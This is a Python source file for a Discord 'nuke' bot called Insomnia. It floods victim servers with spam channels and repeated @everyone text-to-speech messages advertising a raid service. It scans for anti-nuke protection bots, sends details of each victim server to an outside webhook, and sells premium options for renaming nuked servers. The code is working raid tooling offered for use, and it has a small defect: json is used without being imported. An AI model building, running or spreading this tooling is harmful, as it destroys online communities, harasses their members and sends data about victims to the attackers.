import asyncio
import os
import random
from datetime import datetime

import aiohttp
import discord
from discord import Interaction
from discord.errors import HTTPException
from discord.ui import Button, Select, View

from config import LOG_WEBHOOK_URL, leave_hook
from core.utils import (
    get_channel_name,
    get_role_name,
    get_server_name,
    get_show_username,
    get_webhook_message,
    get_webhook_name,
    is_premium_user,
    set_user_config,
)


async def safe_webhook_send(webhook, channel, content=None, embed=None, username=None, avatar_url=None):
    try:
        await webhook.send(content=content, embed=embed, username=username, avatar_url=avatar_url)
    except HTTPException as e:
        if e.status == 429:
            print("[!] Webhook rate limited, sending message normally instead.")
            await channel.send(content=content, embed=embed)
        else:
            print(f"[!] Webhook send failed: {e}")


async def handle_toggle_setting(interaction: Interaction, setting_key: str, current_value: bool):
    new_value = not current_value
    set_user_config(interaction.user.id, setting_key, new_value)
    await interaction.response.send_message(f"`{setting_key}` set to `{new_value}`.", ephemeral=True)


async def handle_set_name_setting(interaction: Interaction, setting_key: str, new_value: str):
    user_id = interaction.user.id
    if setting_key != "show_username":
        if not is_premium_user(user_id):
            defaults = {
                "channel_name": "insomnia-on-top",
                "webhook_name": "insomnia",
                "webhook_message": "Server has been nuked!",
                "server_name": "insomnia owns this",
                "role_name": "join insomnia",
            }
            set_user_config(user_id, setting_key, defaults.get(setting_key, ""))
            await interaction.response.send_message(
                f"You must be a premium user to set `{setting_key}`. Value reset to default.", ephemeral=True
            )
            return

    set_user_config(user_id, setting_key, new_value)
    await interaction.response.send_message(f"`{setting_key}` set to `{new_value}`.", ephemeral=True)


async def send_log(ctx):
    guild = ctx.guild
    user = ctx.author
    show_name = get_show_username(user.id)

    log_text = ""
    try:
        with open("data/log_messages.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
            if lines:
                log_text = random.choice(lines)
    except Exception as e:
        print(f"[!] log msg error: {e}")

    embed = discord.Embed(
        title="Command Executed",
        color=discord.Color.red(),
        timestamp=datetime.utcnow()
    )
    embed.add_field(name="Server Name", value=f"`{guild.name}`", inline=True)
    embed.add_field(name="Members", value=f"`{guild.member_count}`", inline=True)
    embed.add_field(name="Server Owner", value=f"`{guild.owner}` ({guild.owner.name})", inline=False)
    embed.add_field(name="Server Created", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
    embed.add_field(name="Roles", value=f"`{len(guild.roles)}`", inline=True)
    embed.add_field(name="Emojis", value=f"`{len(guild.emojis)}`", inline=True)
    embed.add_field(name="Boost Level", value=f"`{guild.premium_tier}`", inline=True)
    embed.add_field(name="Boost Count", value=f"`{guild.premium_subscription_count}`", inline=True)
    embed.add_field(name="Verification Level", value=f"`{str(guild.verification_level).capitalize()}`", inline=True)

    if show_name:
        embed.add_field(
            name="Command Run By",
            value=f"`{user.display_name}` ({user.name})",
            inline=False
        )
    else:
        embed.add_field(
            name="Command Run By",
            value="`hidden`",
            inline=False
        )

    embed.add_field(name="Bot Latency", value=f"`{round(ctx.bot.latency * 1000)} ms`", inline=True)

    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text=f"Server ID: {guild.id}")

    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(LOG_WEBHOOK_URL, session=session)
        await webhook.send(content=log_text or None, embed=embed)


async def log(message: str):
    print(message)

    async with aiohttp.ClientSession() as session:
        try:
            await session.post(leave_hook, json={"content": message})
        except Exception as e:
            print(f"[LOGGING ERROR] {e}")


async def create_channel_and_send_message(guild, user):
    user_config = get_user_config_for_nuke(user.id)
    channel_name = user_config.get("channel_name", "insomnia-on-top")
    webhook_message = user_config.get("webhook_message", "insomnia owns this")

    try:
        ch = await guild.create_text_channel(name=channel_name)

        embed = discord.Embed(
            title="**__NUKED BY INSOMNIA__**",
            description=(
                "`Unfortunately this server has been nuked due to admins' inattention.`\n"
                "### If you're interested in this bot or you need to destroy somebody's server you can [join](https://discord.gg/VSQzzAMVw3) our discord server.\n"
                "**Insomnia has:**\n"
                "> **Powerful bots with uptime 24/7**\n"
                "> **Raid/Nuke features**\n"
                "> **Good community**"
            ),
            color=0xb161f9
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")

        if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
            is_premium = is_premium_user(user.id)
            spams = 25 if is_premium else 10
            for _ in range(spams):
                await ch.send(
                    content="@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI",
                    embed=embed,
                    tts=True
                )
        else:
            for _ in range(10):
                await ch.send(webhook_message)

    except Exception as e:
        print(f"[!] Channel/message failed: {e}")


def get_user_config_for_nuke(user_id):
    if not os.path.exists("config.json"):
        return {}
    with open("config.json", "r") as f:
        try:
            config = json.load(f)
        except json.JSONDecodeError:
            return {}
    return config.get(str(user_id), {})


async def detect_antinuke_bots(guild):
    from config import BLOCKED_BOT_IDS, BLOCKED_BOT_NAMES
    found_bots = []

    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                found_bots.append(f"{bot_name} ({member.id})")

    return found_bots


class SettingsModal(discord.ui.Modal):
    def __init__(self, user_id: int):
        super().__init__(title="Configure your settings")
        self.user_id = user_id

        self.show_username_input = discord.ui.TextInput(
            label="Show username? (yes/no)",
            placeholder="yes or no",
            default="yes" if get_show_username(user_id) else "no",
            max_length=3,
            required=False
        )
        self.channel_name_input = discord.ui.TextInput(
            label="Channel Name (Premium required)",
            placeholder="nuked-channel",
            default=get_channel_name(user_id),
            max_length=32,
            required=False
        )
        self.webhook_name_input = discord.ui.TextInput(
            label="Webhook Name (Premium required)",
            placeholder="Nuke Webhook",
            default=get_webhook_name(user_id),
            max_length=32,
            required=False
        )
        self.webhook_message_input = discord.ui.TextInput(
            label="Webhook Message (Premium required)",
            placeholder="Server has been nuked!",
            default=get_webhook_message(user_id),
            max_length=100,
            required=False
        )
        self.server_name_input = discord.ui.TextInput(
            label="Server Name (Premium required)",
            placeholder="Nuked Server",
            default=get_server_name(user_id),
            max_length=32,
            required=False
        )

        self.add_item(self.show_username_input)
        self.add_item(self.channel_name_input)
        self.add_item(self.webhook_name_input)
        self.add_item(self.webhook_message_input)
        self.add_item(self.server_name_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id
        is_premium = is_premium_user(user_id)

        show_username_input = self.show_username_input.value.strip().lower()
        if show_username_input in ["yes", "no"]:
            from core.utils import set_show_username
            set_show_username(user_id, show_username_input == "yes")

        def safe_set(key, value, default):
            if is_premium:
                set_user_config(user_id, key, value)
            else:
                set_user_config(user_id, key, default)

        safe_set("channel_name", self.channel_name_input.value.strip(), "nuked-channel")
        safe_set("webhook_name", self.webhook_name_input.value.strip(), "Nuke Webhook")
        safe_set("webhook_message", self.webhook_message_input.value.strip(), "Server has been nuked!")
        safe_set("server_name", self.server_name_input.value.strip(), "Nuked Server")

        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)


class DashboardView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=180)
        self.user_id = user_id

    @discord.ui.button(label="Configure Settings", style=discord.ButtonStyle.primary)
    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SettingsModal(self.user_id))


async def leave_all_servers():
    from core.bot import bot

    from config import BLACKLISTED_GUILD_ID

    all_guilds = bot.guilds
    to_leave = [g for g in all_guilds if g.id != BLACKLISTED_GUILD_ID]
    total_to_leave = len(to_leave)

    await log(f"[AUTO-LEAVE] I am in {len(all_guilds)} servers, leaving {total_to_leave} (excluding blacklist).")

    left = 0
    for i, guild in enumerate(to_leave, 1):
        try:
            await guild.leave()
            left += 1
        except Exception as e:
            await log(f"[ERROR] Could not leave {guild.name} ({guild.id}): {e}")

        if i % 5 == 0 or i == total_to_leave:
            await log(f"[AUTO-LEAVE] Progress: {left}/{total_to_leave}")

        await asyncio.sleep(1)

    await log(f"[AUTO-LEAVE] Finished! Left {left} servers (excluding blacklist).")
